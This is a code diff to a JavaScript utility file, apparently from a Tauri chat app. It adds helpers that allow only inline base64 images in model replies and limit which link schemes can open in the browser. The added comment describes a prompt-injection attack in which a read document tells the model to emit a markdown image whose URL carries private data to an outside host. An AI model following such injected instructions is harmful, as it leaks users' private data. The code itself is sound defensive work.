@@ -1262,6 +1262,32 @@ function restoreMathSegments(html, segments, renderSegment) {
   });
 }
 
+// ── What a reply may show, and where its links may go ─────────────────────
+// A model's reply is untrusted text. A document it read can carry an
+// instruction to answer with `![x](https://host/p.png?d=<something private>)`,
+// and a webview that fetches that image has sent the data out. So the only
+// image a reply may show is one whose bytes are already in the reply. Any
+// other source (http, //host, a relative path, file:, asset:) is turned
+// into a link by markdown.jsx (neutraliseRemoteContent).
+function replyImageIsInline(src) {
+  return typeof src === 'string'
+    && /^data:image\/(png|jpe?g|gif|webp|bmp|avif);base64,/i.test(src.trim());
+}
+
+// The URL a link in a reply may hand to the default browser, or null. Only
+// http(s) and mailto leave the app. Anything else (javascript:, file:,
+// tauri:, a relative path that would resolve against the app's own origin)
+// is not followed at all, and the app window itself never navigates
+// (handleReplyLinkClick in markdown.jsx).
+function externalLinkTarget(href) {
+  if (typeof href !== 'string') return null;
+  const s = href.trim();
+  if (/^https?:\/\/[^\s\/]/i.test(s)) return s;
+  if (/^\/\/[^\s\/]/.test(s)) return 'https:' + s;
+  if (/^mailto:[^\s]/i.test(s)) return s;
+  return null;
+}
+
 // Fuzzy match scorer for the command palette (ui/command-palette.jsx).
 // Returns a score (higher = better) or -1 for "no match". Every match
 // scores ≥ 1 so callers can use `< 0` as the reject test; the empty
@@ -1600,6 +1626,8 @@ if (typeof window !== "undefined") {
   window.describeContextOverflow = describeContextOverflow;
   window.extractMathSegments = extractMathSegments;
   window.restoreMathSegments = restoreMathSegments;
+  window.replyImageIsInline = replyImageIsInline;
+  window.externalLinkTarget = externalLinkTarget;
 }
 
 // ── instantiateSpacePinnedAttachments ────────────────────────────────────
@@ -1832,5 +1860,7 @@ if (typeof module !== "undefined" && module.exports) {
     describeContextOverflow,
     extractMathSegments,
     restoreMathSegments,
+    replyImageIsInline,
+    externalLinkTarget,
   };
 }
